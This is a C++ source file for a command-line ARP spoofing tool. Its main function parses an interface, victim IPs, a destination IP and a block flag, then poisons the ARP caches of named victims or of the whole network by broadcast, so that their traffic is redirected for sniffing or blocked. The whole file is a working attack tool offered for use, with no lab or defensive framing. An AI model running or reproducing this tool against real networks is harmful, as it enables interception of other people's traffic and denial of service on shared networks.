#include <boost/program_options.hpp>

#include <iostream>
#include <memory>
#include <ctime>
using namespace std;

#include "lib/linux/linux_iface.h"
#include "lib/linux/linux_iface_net_access.h"
#include "lib/linux/hardware.h"

#include "src/protocols/ether/ethernet2_protocol.h"
#include "src/protocols/arp/arp_header.h"
#include "src/protocols/arp/arp_protocol.h"

#include "src/tools/arp_tool/arp_tool.h"


void arp_spoof(string const& iface_name, vector<ip4_addr> const& victims, ip4_addr dest, bool block) {
    /* network access in linux */
    shared_ptr<linux_iface> iface = make_shared<linux_iface>(iface_name);
    shared_ptr<net_access_bytes> iface_net_access = make_shared<linux_iface_net_access_bytes>(iface);

    /* show victims */
    std::cout << "victims: ";
    if (victims.empty()) std::cout << "all broadcast";
    else
        for (int i = 0; i < victims.size(); i++) {
            if (i > 0) cout << ", ";
            cout << ip4_addr_to_str(victims[i]);
        }
    std::cout << endl;

    /* spoof attack */
    if (victims.empty()) { // spoof whole network (broadcast)
        /* net access for ethernet broadcast arp */
        shared_ptr<net_access_bytes> net_access_eth_broadcast_arp = make_shared<ethernet2_protocol::net_access_broadcast>(iface_net_access, get_mac_addr_of_iface(iface_name).value(), ethertype::arp);

        cout << "spoofing entire network" << endl;
        arp_tool::spoofing_attack(
            {{net_access_eth_broadcast_arp, mac_addr_empty, ip4_addr_empty}}, // no need for the associated mac and ip addr for the arp, as we send to broadcast
            dest,
            get_mac_addr_of_iface(iface_name).value(), get_ip_addr_of_iface(iface_name).value(),
            block
        ); 

    } else { // spoof individually
        vector<tuple<shared_ptr<net_access_bytes>, mac_addr, ip4_addr>> targets(victims.size());
        for (int i = 0; i < victims.size(); i++) {
            ip4_addr victim_ip_addr = victims[i];

            static shared_ptr<net_access_bytes> tmp_net_access_eth_broadcast_arp = make_shared<ethernet2_protocol::net_access_broadcast>(iface_net_access, get_mac_addr_of_iface(iface_name).value(), ethertype::arp);
            mac_addr victim_mac_addr = arp_tool::search_for_mac_addr(
                tmp_net_access_eth_broadcast_arp,
                victim_ip_addr,
                get_mac_addr_of_iface(iface_name).value(), get_ip_addr_of_iface(iface_name).value()
            );

            targets[i] = {
                make_shared<ethernet2_protocol::net_access_single>(iface_net_access, victim_mac_addr, get_mac_addr_of_iface(iface_name).value(), ethertype::arp),
                victim_mac_addr,
                victim_ip_addr
            };
        }

        cout << "spoofing all victims" << endl;
        arp_tool::spoofing_attack(
            targets,
            dest,
            get_mac_addr_of_iface(iface_name).value(), get_ip_addr_of_iface(iface_name).value(),
            block
        );
    }

}

namespace po = boost::program_options;

int main(int argc, char **argv) {
    po::options_description opts("spoof arp entries. allows you to sniff and block traffic.");
    opts.add_options()
            ("help,h", "print tool use description")
            ("iface", po::value<string>(), "linux interface to use")
            ("victims", po::value<vector<string>>()->multitoken(),
             "victims' ip for the attack. if not specified, sends to whole network (broadcast)")
            ("dest", po::value<string>(),
             "destination ip from the victims into")
            ("block", "block the traffic.");

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, opts), vm);
    po::notify(vm);


    if (vm.count("help")) {
        std::cout << opts << endl;
        return 1;
    }

    if (!vm.count("iface")) {
        std::cout << opts << endl;
        return 1;
    }
    string iface = vm["iface"].as<string>();

    ip4_addr dest;
    if (!vm.count("dest")) {
        std::cout << opts << endl;
        return 1;
    } else {
        if (auto tmp = str_to_ip4_addr(vm["dest"].as<string>()); tmp.has_value()) dest = tmp.value();
        else {
            cout << "invalid dest ip" << endl;
            return 1;
        }
    } 

    bool block;
    if (vm.count("block")) block = true;
    else block = false;

    vector<ip4_addr> victims;
    if (vm.count("victims")) {
        for (string const& ip_addr : vm["victims"].as<vector<string>>()) {
            auto tmp = str_to_ip4_addr(ip_addr);
            if (!tmp.has_value()) {
                cout << "invalid victim ip" << endl;
                return 1;
            }

            victims.push_back(tmp.value());
        }
    }

    arp_spoof(iface, victims, dest, block);

}